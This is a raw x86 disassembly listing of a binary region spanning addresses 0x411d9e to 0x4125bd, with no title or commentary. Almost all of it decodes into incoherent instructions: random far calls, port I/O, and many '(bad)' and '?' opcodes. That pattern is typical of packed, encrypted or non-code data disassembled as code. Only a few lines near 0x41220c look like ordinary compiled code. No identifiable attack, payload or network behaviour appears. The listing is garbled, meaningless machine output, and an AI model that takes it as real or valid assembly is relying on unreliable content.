  411d9e:	sub    ah,BYTE PTR [ecx-0x50]
  411da1:	into   
  411da2:	fadd   QWORD PTR [ebx]
  411da4:	adc    eax,0x9354c8ea
  411da9:	xor    DWORD PTR [esi+0x3a],0x7cc3856c
  411db0:	mov    ecx,0xc1380484
  411db5:	sbb    BYTE PTR [edi+0x6adfd262],dh
  411dbb:	sub    eax,0x9cd0edfb
  411dc0:	jl     0x411e24
  411dc2:	fistp  WORD PTR [eax]
  411dc4:	int3   
  411dc5:	adc    BYTE PTR [edx+0x73],dl
  411dc8:	out    0xe1,al
  411dca:	jl     0x411d59
  411dcc:	push   esi
  411dcd:	or     ah,BYTE PTR gs:[edx-0x4ff2ee00]
  411dd4:	out    dx,eax
  411dd5:	jecxz  0x411e17
  411dd7:	mov    cl,0x2
  411dd9:	fs clc 
  411ddb:	xor    BYTE PTR [edi],0x5e
  411dde:	or     eax,0x8d850ac
  411de3:	fwait
  411de4:	mov    cl,0x49
  411de6:	pop    esp
  411de7:	(bad)
  411deb:	test   al,0x30
  411ded:	arpl   WORD PTR [edx],cx
  411def:	pop    eax
  411df0:	ret    0x728e
  411df3:	or     ebx,edi
  411df5:	sub    BYTE PTR [eax+0x309cf0cc],0x40
  411dfc:	cmp    edx,DWORD PTR [edi-0x5d5737ff]
  411e02:	popa   
  411e03:	mov    esi,esi
  411e05:	lods   al,BYTE PTR ds:[esi]
  411e06:	dec    esi
  411e07:	test   DWORD PTR [ebp+0x28],0xf9aa08ae
  411e0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e0f:	xor    ch,BYTE PTR [edi+esi*4]
  411e12:	call   0xfe00:0x6f353aa4
  411e19:	sbb    edx,DWORD PTR [ebp-0x668f919e]
  411e1f:	lea    edx,[ebx-0x4830d117]
  411e25:	les    esi,FWORD PTR [ecx+0x7f89ded8]
  411e2b:	jns    0x411e1c
  411e2d:	and    al,0x9
  411e2f:	sbb    DWORD PTR [ebx+0xf8285fd],ecx
  411e35:	ret    0x558b
  411e38:	lods   al,BYTE PTR gs:[esi]
  411e3a:	test   DWORD PTR [eax],0xff3f310c
  411e40:	add    ch,BYTE PTR [esi+0x0]
  411e43:	(bad)  
  411e44:	ret    0xa13b
  411e47:	fist   DWORD PTR [esi-0x45]
  411e4a:	push   ds
  411e4b:	test   DWORD PTR [ecx+0x36ba53f2],eax
  411e51:	pop    es
  411e52:	mov    ebp,0x9f63983
  411e57:	daa    
  411e58:	call   0x994b:0x2e24feb
  411e5f:	jbe    0x411e50
  411e61:	dec    ebp
  411e62:	gs jno 0x411ebe
  411e65:	push   ecx
  411e66:	cmp    eax,0x9f65c812
  411e6b:	test   eax,0x22a8daf8
  411e70:	jno    0x411e51
  411e72:	mov    al,ds:0x1999992e
  411e77:	call   0xf3736d9d
  411e7c:	call   0x3a93:0x97aaf9b1
  411e83:	mov    dh,0x60
  411e85:	adc    BYTE PTR [edx],bl
  411e87:	sbb    al,0xb0
  411e89:	imul   edx,eax,0x4d91f151
  411e8f:	test   al,0x3e
  411e91:	mov    ah,0xb4
  411e93:	in     eax,dx
  411e94:	adc    al,0x29
  411e96:	daa    
  411e97:	inc    ebx
  411e98:	sbb    esi,DWORD PTR [esi]
  411e9a:	and    DWORD PTR [edi+0x733671b7],esp
  411ea0:	jns    0x411ed2
  411ea2:	jmp    0x411e36
  411ea4:	in     al,0x9
  411ea6:	std    
  411ea7:	cmp    BYTE PTR [esp+edx*8-0x7d],dh
  411eab:	push   cs
  411eac:	fsubrp st(4),st
  411eae:	xchg   BYTE PTR [ebp-0x1b],bh
  411eb1:	adc    esi,esi
  411eb3:	fwait
  411eb4:	out    dx,al
  411eb5:	mov    ecx,0xe4b17098
  411eba:	dec    edi
  411ebb:	sahf   
  411ebc:	sbb    cl,BYTE PTR [ecx+0x66c6d66]
  411ec2:	mov    eax,0x9143658
  411ec7:	cli    
  411ec8:	jl     0x411e8a
  411eca:	mov    esi,0xe8d7548f
  411ecf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ed0:	popa   
  411ed1:	stos   DWORD PTR es:[edi],eax
  411ed2:	mov    ebx,0x71e61038
  411ed7:	leave  
  411ed8:	pop    edi
  411ed9:	lahf   
  411eda:	add    eax,0xf6f7ced5
  411edf:	sbb    ebx,esp
  411ee1:	xchg   edi,eax
  411ee2:	fist   DWORD PTR [esi+0x7df8290c]
  411ee8:	or     eax,0xf38bb67e
  411eed:	mov    ds:0xe38d0ced,eax
  411ef2:	mov    esi,0x3f975cfc
  411ef7:	mov    DWORD PTR [ecx-0x7c],eax
  411efa:	cwde   
  411efb:	adc    DWORD PTR [ebx+0x36a765d2],ecx
  411f01:	cs into 
  411f03:	shr    WORD PTR [ebp-0x61],1
  411f07:	dec    DWORD PTR [ecx]
  411f09:	xlat   BYTE PTR ds:[ebx]
  411f0a:	mov    edx,0x46004e92
  411f0f:	mov    edi,0xaf2d9ef0
  411f14:	inc    edi
  411f15:	sub    eax,0x2b9326ab
  411f1a:	ret    
  411f1b:	jns    0x411ed7
  411f1d:	push   0xb923ff4e
  411f22:	imul   eax,DWORD PTR [ebp-0x79],0x420e3f23
  411f29:	dec    edx
  411f2a:	out    0xd9,al
  411f2c:	push   0x4b
  411f2e:	adc    eax,DWORD PTR [esi-0x56]
  411f31:	adc    al,0x76
  411f33:	inc    esp
  411f34:	sahf   
  411f35:	call   0x9d28:0x93eeeab9
  411f3c:	inc    edx
  411f3d:	fwait
  411f3e:	pop    esp
  411f3f:	lods   eax,DWORD PTR ds:[esi]
  411f40:	dec    edx
  411f41:	push   ebx
  411f42:	sub    BYTE PTR [eax+ebx*4-0x7a57f47],0xa3
  411f4a:	imul   esi,ebp,0xffffffff
  411f4d:	mov    gs,WORD PTR [edi]
  411f4f:	ja     0x411ed6
  411f51:	dec    eax
  411f52:	neg    dl
  411f54:	xchg   DWORD PTR [ebx],esi
  411f56:	jns    0x411f8f
  411f58:	cwde   
  411f59:	popa   
  411f5a:	(bad)  
  411f5b:	neg    al
  411f5d:	mov    ebp,0xff8e31f7
  411f62:	mov    esi,0x75472680
  411f67:	xor    eax,0x21bf368
  411f6c:	ret    0x40db
  411f6f:	sub    al,0x91
  411f71:	les    esi,FWORD PTR [edx-0x75]
  411f74:	push   ebp
  411f75:	les    ecx,FWORD PTR [ebx-0x7cc0383]
  411f7b:	xor    edx,eax
  411f7d:	jmp    0x412205
  411f82:	rol    dl,1
  411f84:	enter  0xdac3,0xd1
  411f88:	fcmovnu st,st(1)
  411f8a:	xchg   ebp,eax
  411f8b:	add    al,0x8c
  411f8d:	inc    edi
  411f8e:	(bad)  
  411f8f:	loopne 0x411f85
  411f91:	shr    ebx,1
  411f93:	imul   edi,DWORD PTR [eax+0x78],0xffffffe5
  411f97:	jle    0x412011
  411f99:	js     0x411f2c
  411f9b:	shl    ecx,cl
  411f9d:	stos   BYTE PTR es:[edi],al
  411f9e:	in     eax,dx
  411f9f:	jg     0x411f5a
  411fa1:	int    0x20
  411fa3:	mov    al,ds:0xbdf3b5e5
  411fa8:	out    dx,eax
  411fa9:	aaa    
  411faa:	push   edi
  411fab:	lahf   
  411fac:	pop    ebp
  411fad:	mov    ds:0xe6f046df,al
  411fb2:	cmp    BYTE PTR [edx],0xb
  411fb5:	mov    dx,0xf9c8
  411fb9:	dec    ebx
  411fba:	sar    DWORD PTR [ebx],0x21
  411fbd:	sbb    bl,BYTE PTR [eax]
  411fbf:	sub    al,0x49
  411fc1:	xor    al,0x68
  411fc3:	into   
  411fc4:	sbb    eax,0x81b2073f
  411fc9:	mov    dl,0x41
  411fcb:	mov    ds:0x8f2c6d0a,eax
  411fd0:	(bad)  
  411fd1:	dec    edx
  411fd2:	in     al,0xe4
  411fd4:	shl    DWORD PTR [ebx],cl
  411fd6:	sub    ch,BYTE PTR [ecx]
  411fd8:	inc    ebx
  411fd9:	jnp    0x41200d
  411fdb:	xchg   ebp,eax
  411fdc:	mov    BYTE PTR [ebx-0x325a21e5],cl
  411fe2:	test   al,0xad
  411fe4:	jns    0x411fa9
  411fe6:	stos   DWORD PTR es:[edi],eax
  411fe7:	pop    ecx
  411fe8:	gs pop esi
  411fea:	test   DWORD PTR [ebx-0x2e],ebx
  411fed:	repnz pop ebx
  411fef:	jb     0x412038
  411ff1:	push   ecx
  411ff2:	mov    dh,0x9c
  411ff4:	mov    ch,bl
  411ff6:	dec    esp
  411ff7:	or     BYTE PTR [esi],ch
  411ff9:	jge    0x412034
  411ffb:	adc    al,0xcb
  411ffd:	(bad)
  412001:	dec    edi
  412002:	inc    esp
  412003:	xchg   edx,eax
  412004:	sbb    eax,0x724fb45
  412009:	jp     0x412054
  41200b:	cmp    ebx,DWORD PTR [eax+0x1ca903d1]
  412011:	push   es
  412012:	sub    al,0xd6
  412015:	mov    ebx,0x9a6869f1
  41201a:	or     DWORD PTR [ebx],0xffffffa7
  41201d:	dec    DWORD PTR [ebx]
  41201f:	shl    BYTE PTR [esi+0x657dddf1],0xbe
  412026:	gs inc ebx
  412028:	arpl   WORD PTR [ecx],di
  41202a:	inc    esi
  41202b:	iret   
  41202c:	mov    edi,0xe9a7520b
  412031:	xchg   ebx,eax
  412032:	dec    ecx
  412033:	ja     0x411fce
  412035:	add    DWORD PTR [edi*4+0x3cf2cfb0],ebp
  41203c:	dec    esp
  41203d:	jge    0x412056
  41203f:	mov    ds:0xa2a78f7e,eax
  412044:	fnstcw WORD PTR ds:0x2fa2d5bd
  41204a:	imul   esi,DWORD PTR [esi-0x26],0x4a
  41204e:	xor    dh,dl
  412050:	xchg   ecx,eax
  412051:	jns    0x412085
  412053:	inc    esp
  412054:	daa    
  412055:	mov    BYTE PTR [ecx-0x74],dl
  412058:	or     bh,BYTE PTR [ecx+0x38]
  41205b:	fistp  QWORD PTR ds:0x2f8f71cc
  412061:	test   al,0x1f
  412063:	adc    al,0xf7
  412065:	sbb    ebp,DWORD PTR [edi+0x70da93ae]
  41206b:	or     al,0xf
  41206d:	sub    al,0xc8
  41206f:	sahf   
  412070:	mov    BYTE PTR ds:0xfcac04fe,dh
  412076:	hlt    
  412077:	lea    esi,[edi]
  412079:	fdiv   DWORD PTR [edx]
  41207b:	and    al,0x8f
  41207d:	sub    al,0x1
  412080:	adc    al,0x3b
  412082:	retf   0x7118
  412085:	xchg   esi,eax
  412086:	out    0xec,eax
  412088:	jb     0x4120c1
  41208a:	mov    bl,0x94
  41208c:	call   0xbe12:0x102390e5
  412093:	and    esp,eax
  412095:	mov    al,0x1
  412097:	into   
  412098:	or     BYTE PTR [ebx],dl
  41209a:	and    ah,ch
  41209c:	call   0xb2577664
  4120a1:	fisubr WORD PTR [ebx+0x41dcb70f]
  4120a7:	out    dx,al
  4120a8:	mov    dl,0xc7
  4120aa:	push   ss
  4120ab:	lock sub eax,0xb095f23c
  4120b1:	jno    0x412132
  4120b3:	inc    esp
  4120b4:	ja     0x4120d1
  4120b6:	mov    ebx,edx
  4120b8:	jl     0x4120a9
  4120ba:	int3   
  4120bb:	inc    esp
  4120bc:	fwait
  4120bd:	adc    ebx,0x2fd740f8
  4120c3:	arpl   WORD PTR [ebx],bx
  4120c5:	fild   WORD PTR ss:[eax+0x3e]
  4120c9:	(bad)  
  4120ca:	repz jge 0x41204f
  4120cd:	dec    ecx
  4120ce:	fisub  DWORD PTR [ebx]
  4120d0:	jp     0x412084
  4120d2:	mov    WORD PTR [ecx+ebx*4],?
  4120d5:	fisttp WORD PTR [eax+0x168f23f4]
  4120db:	adc    DWORD PTR [eax+edi*2-0x1fcf6a58],esp
  4120e2:	pop    edi
  4120e3:	sub    al,0xc6
  4120e5:	push   0xb00be124
  4120ea:	add    ch,ch
  4120ec:	jne    0x412160
  4120ee:	icebp  
  4120ef:	jg     0x41212d
  4120f1:	mov    esi,0x6a092deb
  4120f6:	stc    
  4120f7:	dec    esp
  4120f8:	shl    DWORD PTR [edi],cl
  4120fa:	mov    ebp,0x33478103
  4120ff:	sub    ah,ah
  412101:	cmp    al,0x16
  412103:	in     al,dx
  412104:	(bad)  
  412105:	arpl   bx,dx
  412107:	xor    DWORD PTR [ebx-0x73ebce5d],ebp
  41210d:	jmp    0x5c2bb647
  412112:	gs mov ebx,0xf27ac2c
  412118:	push   ss
  412119:	mov    ds:0x9f060c66,al
  41211e:	outs   dx,DWORD PTR ds:[esi]
  41211f:	leave  
  412120:	or     al,0x4
  412122:	mov    al,ds:0x7b4e6da5
  412127:	int3   
  412128:	in     al,dx
  412129:	add    DWORD PTR [ecx],0xffffffc7
  41212c:	jge    0x412185
  41212e:	fisub  WORD PTR ds:0x62a17ed
  412134:	cdq    
  412135:	mov    eax,0xcc4af6d9
  41213a:	pusha  
  41213b:	or     eax,0x3ddbf9ba
  412140:	fld    DWORD PTR [ecx-0x1a]
  412143:	jno    0x412140
  412145:	iret   
  412146:	xlat   BYTE PTR ds:[ebx]
  412147:	mov    cl,0x46
  412149:	jp     0x4121a7
  41214b:	cmc    
  41214c:	push   ebx
  41214d:	in     al,dx
  41214e:	xchg   ebp,eax
  41214f:	sub    ebp,esi
  412151:	jae    0x412120
  412153:	fsub   DWORD PTR [edx+0x4547545b]
  412159:	shl    eax,0xd2
  41215c:	cmp    eax,0x2ebedf1c
  412161:	sbb    ebx,DWORD PTR [eax]
  412163:	cmp    esp,DWORD PTR [eax]
  412165:	push   esp
  412166:	outs   dx,DWORD PTR ds:[esi]
  412167:	lods   eax,DWORD PTR ds:[esi]
  412168:	pop    ebp
  412169:	test   BYTE PTR [ebx-0x7b],bh
  41216c:	(bad)  
  41216d:	and    DWORD PTR [ecx-0x49],eax
  412170:	push   ecx
  412171:	cs jmp 0xb97c290b
  412177:	inc    esi
  412178:	rol    BYTE PTR [ebp-0x3b3ca9f1],cl
  41217e:	cld    
  41217f:	jp     0x41214a
  412181:	add    DWORD PTR [esi+0x4904c7b9],ecx
  412187:	or     bh,BYTE PTR [edx+eiz*8+0x7a]
  41218b:	inc    esp
  41218c:	mov    DWORD PTR [eax],esi
  41218e:	inc    edx
  41218f:	sti    
  412190:	fcomp  DWORD PTR [eax+0x19]
  412193:	cmc    
  412194:	add    ah,BYTE PTR [edi-0x1c]
  412197:	dec    edx
  412198:	(bad)  
  412199:	call   0xd850cfdd
  41219e:	cwde   
  41219f:	xor    dl,BYTE PTR ds:0x8d19942c
  4121a5:	and    eax,0xf8690f4
  4121aa:	scas   al,BYTE PTR es:[edi]
  4121ab:	sub    esp,DWORD PTR [ecx+0x53e9b3cc]
  4121b1:	out    0xde,eax
  4121b3:	cs jge 0x412175
  4121b6:	mov    dl,0x5d
  4121b8:	mov    ah,0x0
  4121ba:	lds    ecx,FWORD PTR [ecx+0x8aecf8f]
  4121c0:	jno    0x4121cb
  4121c2:	repz push ds
  4121c4:	inc    ebx
  4121c5:	out    dx,al
  4121c6:	daa    
  4121c7:	pop    ds
  4121c8:	xchg   BYTE PTR [ecx],cl
  4121ca:	(bad)  
  4121cb:	daa    
  4121cc:	and    esp,esi
  4121ce:	xchg   esp,eax
  4121cf:	mov    WORD PTR [esp+esi*1],cs
  4121d2:	(bad)  
  4121d3:	int    0xa8
  4121d5:	mov    dl,dl
  4121d7:	mov    edi,0xce0bcae7
  4121dc:	nop
  4121dd:	add    BYTE PTR [ebx+0x3d],0xe0
  4121e1:	sub    DWORD PTR [ebp+ebp*8+0x7a],0xd1e7584f
  4121e9:	or     BYTE PTR [edx+ecx*1],bh
  4121ec:	test   al,0x79
  4121ee:	sbb    eax,0x602b5236
  4121f3:	push   ebx
  4121f4:	cld    
  4121f5:	test   al,0x73
  4121f7:	xchg   esp,eax
  4121f8:	pop    esi
  4121f9:	xor    eax,0xdfa11305
  4121fe:	ins    DWORD PTR es:[edi],dx
  4121ff:	and    esp,edx
  412201:	arpl   WORD PTR fs:[ecx+0x3f903de],si
  412208:	ror    DWORD PTR [edi],1
  41220a:	scas   eax,DWORD PTR es:[edi]
  41220b:	xlat   BYTE PTR ds:[ebx]
  41220c:	mov    DWORD PTR [ebp+0xc],edx
  41220f:	mov    edx,DWORD PTR [ebp+0xc]
  412212:	mov    DWORD PTR [ebp-0x24],edx
  412215:	mov    edx,DWORD PTR [ebp-0x8]
  412218:	add    edx,DWORD PTR [ebp-0x40]
  41221b:	mov    DWORD PTR [ebp-0x18],0xf89c8538
  412222:	jmp    0x4124aa
  412227:	(bad)
  41222b:	(bad)  
  41222c:	fcmovnu st,st(1)
  41222e:	shr    esp,1
  412230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412231:	xchg   edx,eax
  412232:	(bad)  
  412233:	xchg   BYTE PTR [eax],al
  412235:	test   eax,0x786950cb
  41223a:	js     0x412221
  41223c:	jle    0x4122b6
  41223e:	js     0x4122b4
  412240:	mov    ebx,DWORD PTR [esi]
  412242:	enter  0x4996,0xbb
  412246:	xchg   esi,eax
  412247:	outs   dx,DWORD PTR gs:[esi]
  412249:	xchg   edx,eax
  41224a:	sub    dh,0x66
  41224d:	jecxz  0x412255
  41224f:	emms   
  412251:	outs   dx,BYTE PTR ds:[esi]
  412252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412253:	loop   0x412273
  412255:	(bad)  ss:[esi-0x6f]
  412259:	in     al,dx
  41225a:	out    0x94,al
  41225c:	out    0xeb,eax
  41225e:	push   edx
  41225f:	ja     0x412279
  412261:	daa    
  412262:	rol    BYTE PTR [edi],0x5d
  412265:	inc    edi
  412266:	shr    DWORD PTR [esi-0x788bc3e6],cl
  41226c:	shl    bl,0x6a
  41226f:	sbb    DWORD PTR [eax-0x71ecec4b],ecx
  412275:	inc    ecx
  412276:	iret   
  412277:	das    
  412278:	dec    edx
  412279:	pop    es
  41227a:	stc    
  41227b:	in     al,0x54
  41227d:	mov    ecx,0x96b1cd92
  412282:	retf   
  412283:	dec    ebx
  412284:	inc    esi
  412285:	or     ecx,DWORD PTR [edi]
  412287:	mov    eax,ds:0xe96e4cab
  41228c:	mov    ah,0x98
  41228e:	in     eax,dx
  41228f:	adc    al,0xa9
  412291:	pop    ebp
  412292:	add    BYTE PTR [esi],bh
  412294:	adc    edx,edi
  412296:	and    eax,0x525deccf
  41229b:	push   0x837efba8
  4122a0:	fsubp  st(2),st
  4122a2:	jge    0x41229d
  4122a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122a5:	push   cs
  4122a6:	imul   edi,DWORD PTR [edx],0x2d
  4122a9:	jns    0x412325
  4122ab:	mov    BYTE PTR [esi-0x5f3ddf28],cl
  4122b1:	lahf   
  4122b2:	add    dl,BYTE PTR [esi-0x4cb27bae]
  4122b8:	push   cs
  4122b9:	int    0x57
  4122bb:	lea    esi,[ebp-0x5287321e]
  4122c1:	cmp    dh,ch
  4122c3:	pushf  
  4122c4:	jnp    0x412303
  4122c6:	and    ecx,DWORD PTR [ebp-0x62]
  4122c9:	sub    ecx,DWORD PTR [ecx-0x746e71e2]
  4122cf:	mov    dl,0x9d
  4122d1:	push   ss
  4122d2:	adc    esi,edx
  4122d4:	add    DWORD PTR [edi+0xd4d205f],0x8cb86b
  4122de:	mov    al,0x4b
  4122e0:	and    BYTE PTR [eax],0xae
  4122e3:	fs call 0x9601:0xdcba7ee
  4122eb:	xor    DWORD PTR [eax],esi
  4122ed:	push   ds
  4122ee:	sahf   
  4122ef:	shl    BYTE PTR [ebx-0x23da6b51],1
  4122f5:	mov    al,0xbd
  4122f7:	mov    esi,0x4609c7a
  4122fc:	rcl    BYTE PTR [edx-0x28],0xa4
  412300:	fdecstp 
  412302:	pusha  
  412303:	test   edi,ebx
  412305:	mov    cl,0x39
  412307:	adc    al,BYTE PTR [eax]
  412309:	mov    ds:0x755bb091,eax
  41230e:	les    ebx,FWORD PTR [edi+0x5c]
  412311:	aad    0x6b
  412313:	push   ss
  412314:	jne    0x4122f9
  412316:	push   es
  412317:	pop    ebp
  412318:	push   eax
  412319:	dec    eax
  41231a:	in     al,0x66
  41231c:	int    0xe1
  41231e:	bound  eax,QWORD PTR [esi-0xc]
  412321:	into   
  412322:	cli    
  412323:	xchg   edi,eax
  412324:	rol    BYTE PTR [edi+0x547419f1],0x8
  41232b:	fadd   QWORD PTR [esi]
  41232d:	pusha  
  41232e:	dec    ecx
  41232f:	and    ebp,ebx
  412331:	and    al,0xd4
  412333:	ins    BYTE PTR es:[edi],dx
  412334:	aad    0xaf
  412336:	xor    DWORD PTR [esi],esp
  412338:	lds    edi,FWORD PTR [ecx+0x1bf9280d]
  41233e:	fist   WORD PTR [ebx]
  412340:	xchg   edx,eax
  412341:	pop    es
  412342:	imul   edx,DWORD PTR [ecx],0x6f
  412345:	xor    cl,BYTE PTR [edx+0x4f]
  412348:	or     eax,0x72e4542f
  41234d:	pop    esp
  41234e:	stos   DWORD PTR es:[edi],eax
  41234f:	dec    esp
  412350:	cbw    
  412352:	jg     0x4122fb
  412354:	aad    0xb1
  412356:	stc    
  412357:	or     esp,DWORD PTR [esi-0x2ca6a05f]
  41235d:	lods   eax,DWORD PTR ds:[esi]
  41235e:	mov    eax,ds:0x475a28ff
  412363:	mov    bh,0x27
  412365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412366:	scas   al,BYTE PTR es:[edi]
  412367:	outs   dx,BYTE PTR ds:[esi]
  412368:	test   eax,0x7cfb9390
  41236d:	mov    dl,BYTE PTR [esi+0x73c13c1a]
  412373:	test   DWORD PTR [ecx],esp
  412375:	jg     0x4123a5
  412377:	xor    bh,BYTE PTR [esi]
  412379:	sbb    ebp,DWORD PTR [edx-0x153156d7]
  41237f:	test   DWORD PTR [eax+0x70],edi
  412382:	cmp    BYTE PTR [edi+0x233dcee5],bh
  412388:	mov    WORD PTR [esp+edi*8],ss
  41238b:	xchg   esp,eax
  41238c:	jb     0x4123ee
  41238e:	test   ebx,edx
  412390:	push   eax
  412391:	loop   0x41232f
  412393:	in     al,0xe2
  412395:	mov    dh,0xe4
  412397:	rcr    BYTE PTR [esi],cl
  412399:	xchg   ebp,eax
  41239a:	aam    0x3c
  41239c:	aas    
  41239d:	xor    ecx,DWORD PTR [edx]
  41239f:	in     eax,0x67
  4123a1:	inc    eax
  4123a2:	xchg   esi,eax
  4123a3:	adc    dh,BYTE PTR [edi]
  4123a5:	inc    esp
  4123a6:	scas   eax,DWORD PTR es:[edi]
  4123a7:	jne    0x4123ff
  4123a9:	dec    esi
  4123aa:	sahf   
  4123ab:	xchg   edx,eax
  4123ac:	stos   BYTE PTR es:[edi],al
  4123ad:	cmp    esi,DWORD PTR [esi-0xb]
  4123b0:	gs mov ecx,0xef944d29
  4123b6:	xchg   esp,eax
  4123b7:	dec    edx
  4123b8:	(bad)  
  4123b9:	std    
  4123ba:	imul   ebx,DWORD PTR [edi],0x5fa00bd7
  4123c0:	jmp    0x4123b7
  4123c2:	mov    eax,ds:0x7be2551c
  4123c7:	cld    
  4123c8:	inc    esp
  4123c9:	jmp    0x412435
  4123cb:	mov    bl,0xf4
  4123cd:	repz lock xchg edx,eax
  4123d0:	mov    edi,0x6b067547
  4123d5:	mov    ds:0x837294ee,al
  4123da:	out    dx,al
  4123db:	clc    
  4123dc:	imul   ebx,ebx,0xfffffffe
  4123df:	push   esi
  4123e0:	and    eax,0x5fe6a751
  4123e5:	push   ss
  4123e6:	add    bl,cl
  4123e8:	mov    dl,0x6e
  4123ea:	popf   
  4123eb:	adc    eax,0x69115c85
  4123f0:	ins    WORD PTR es:[edi],dx
  4123f2:	dec    ebp
  4123f3:	push   0x61
  4123f5:	lods   eax,DWORD PTR ds:[esi]
  4123f6:	sub    al,0x11
  4123f8:	int3   
  4123f9:	jnp    0x412423
  4123fb:	cmp    al,0x47
  4123fd:	ja     0x412449
  4123ff:	stos   BYTE PTR es:[edi],al
  412400:	add    edx,DWORD PTR [ecx]
  412402:	sbb    ebx,edi
  412404:	sbb    BYTE PTR [ebx-0x645b18dc],dl
  41240a:	out    0xa9,eax
  41240c:	sbb    ah,BYTE PTR [edx]
  41240e:	fdivp  st(4),st
  412410:	into   
  412411:	je     0x4123af
  412413:	test   ebx,edx
  412415:	push   ecx
  412416:	mov    dl,0x17
  412418:	stc    
  412419:	push   ds
  41241a:	fyl2x  
  41241c:	ins    BYTE PTR es:[edi],dx
  41241d:	smsw   WORD PTR [eax+0x7b]
  412421:	gs mov bh,0x4f
  412424:	xor    cl,BYTE PTR [eax-0x5551033d]
  41242a:	sahf   
  41242b:	aad    0xc0
  41242d:	sbb    BYTE PTR [eax-0x41],0xc7
  412431:	and    esp,DWORD PTR [eax-0x4a]
  412434:	test   DWORD PTR ds:0xa6bc21da,ecx
  41243a:	push   edx
  41243b:	jmp    eax
  41243d:	sbb    al,0x0
  41243f:	pusha  
  412440:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412441:	aas    
  412442:	cmp    al,0x83
  412444:	pop    edx
  412445:	fadd   QWORD PTR [ebx]
  412447:	and    DWORD PTR ds:0x63efb06e,edi
  41244d:	sbb    BYTE PTR [eax],dl
  41244f:	pop    ebx
  412450:	mov    ?,WORD PTR [eax+0x34]
  412453:	push   edx
  412454:	(bad)  [edx+eax*2-0x2afe4c4]
  41245b:	or     DWORD PTR [edx-0x74],esp
  41245e:	cdq    
  41245f:	jno    0x4123ef
  412461:	mov    bh,BYTE PTR [edx-0x7313d9bc]
  412467:	dec    ebp
  412468:	call   0xc8b1:0x5c869c72
  41246f:	sub    BYTE PTR [ecx],dl
  412471:	fdivr  DWORD PTR [eax+0x48cb6deb]
  412477:	mov    edi,0x43e4be65
  41247c:	sub    ch,BYTE PTR [edi+ecx*4]
  41247f:	test   al,0xfa
  412481:	lds    esi,FWORD PTR [esp+eiz*8+0x57]
  412485:	rcl    dh,cl
  412487:	pusha  
  412488:	fcomp  QWORD PTR [ecx+0x7172760e]
  41248e:	jae    0x41246f
  412490:	fiadd  WORD PTR [edi-0x70]
  412493:	dec    edi
  412494:	mov    al,ds:0xda9dc915
  412499:	ret    
  41249a:	jb     0x4124e9
  41249c:	jo     0x412429
  41249e:	cmp    DWORD PTR [eax+0x20c210cf],ecx
  4124a4:	mov    edx,0x45344f89
  4124a9:	add    eax,0xe9e45589
  4124ae:	add    DWORD PTR [edx],0x0
  4124b1:	add    bh,cl
  4124b3:	ret    
  4124b4:	rol    esi,0xd1
  4124b7:	(bad)  
  4124b8:	fcmovnu st,st(1)
  4124ba:	mov    ebx,0x5a1ebe60
  4124bf:	pushf  
  4124c0:	retf   
  4124c1:	mov    ecx,0x78786e3d
  4124c6:	in     eax,0x7e
  4124c8:	js     0x412542
  4124ca:	push   edx
  4124cb:	and    BYTE PTR [eax+0x20bbec27],ah
  4124d1:	dec    ecx
  4124d2:	dec    ecx
  4124d3:	push   es
  4124d4:	cld    
  4124d5:	inc    edi
  4124d6:	mov    edi,0x48bd558a
  4124db:	cld    
  4124dc:	cmp    dl,ch
  4124de:	and    eax,0x3fb24474
  4124e3:	retf   0x3d6b
  4124e6:	loopne 0x41254a
  4124e8:	and    al,0x68
  4124ea:	nop
  4124eb:	add    al,BYTE PTR [edx]
  4124ed:	mov    ds:0xd5843d0d,al
  4124f2:	push   edi
  4124f3:	dec    edi
  4124f4:	and    BYTE PTR [ebx+0x69],al
  4124f7:	push   ecx
  4124f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124f9:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124fb:	dec    esp
  4124fc:	add    eax,0xbc7358d9
  412501:	fwait
  412502:	cld    
  412503:	stos   DWORD PTR es:[edi],eax
  412504:	and    eax,0xc80bb93a
  412509:	leave  
  41250a:	(bad)  
  41250c:	add    eax,0x42ef67ef
  412511:	neg    DWORD PTR [bp+0x16]
  412515:	jno    0x4124a2
  412517:	ds (bad) 
  41251a:	fstp   QWORD PTR [esi-0x360f56cc]
  412520:	dec    esp
  412521:	pop    edi
  412522:	test   BYTE PTR [eax+0x14],dh
  412525:	adc    BYTE PTR [edi-0x238af203],cl
  41252b:	mov    al,ds:0x2eb819d0
  412530:	mov    ebx,0x1c9a24be
  412535:	lock push cs
  412537:	fsubr  QWORD PTR [ebx-0x3d25ee23]
  41253d:	mov    eax,0x61437c6
  412542:	jmp    0x4d9121d3
  412547:	sub    eax,0xaa934cba
  41254c:	mov    al,ds:0x5362e4e0
  412551:	out    dx,eax
  412552:	call   FWORD PTR [ebp+0x73cce8b]
  412558:	jmp    0x412535
  41255a:	cmp    eax,0x5a1ab009
  41255f:	jns    0x412547
  412561:	jmp    0x412583
  412563:	sub    ah,ah
  412565:	ror    DWORD PTR [edx-0x39],1
  412568:	leave  
  412569:	push   0xffffffc1
  41256b:	lds    edx,FWORD PTR [ebx+esi*8-0x7ea05ac0]
  412572:	aaa    
  412573:	idiv   DWORD PTR [esi+eax*1+0x64]
  412577:	ret    
  412578:	xchg   BYTE PTR [ebp+eax*1-0x6e409f45],ah
  41257f:	stc    
  412580:	icebp  
  412581:	enter  0x4d7f,0x3e
  412585:	add    eax,0x7ef2a0bc
  41258a:	test   BYTE PTR [esi-0x9],0x4
  41258e:	mov    edi,0x876cf490
  412593:	cwde   
  412594:	pop    ecx
  412595:	or     al,0xd4
  412597:	sar    ebx,1
  412599:	ins    BYTE PTR es:[edi],dx
  41259a:	rol    BYTE PTR ds:0x7ff73cad,1
  4125a0:	mov    ds:0x841b2fa3,al
  4125a5:	inc    edi
  4125a6:	aam    0x77
  4125a8:	xor    BYTE PTR [ebx+0x2ee27b10],ch
  4125ae:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125b0:	popf   
  4125b1:	cs jmp 0x3aca:0x2b53c28a
  4125b9:	popf   
  4125ba:	hlt    
  4125bb:	xchg   esp,eax
  4125bc:	push   cs
  4125bd:	jge    0x412604
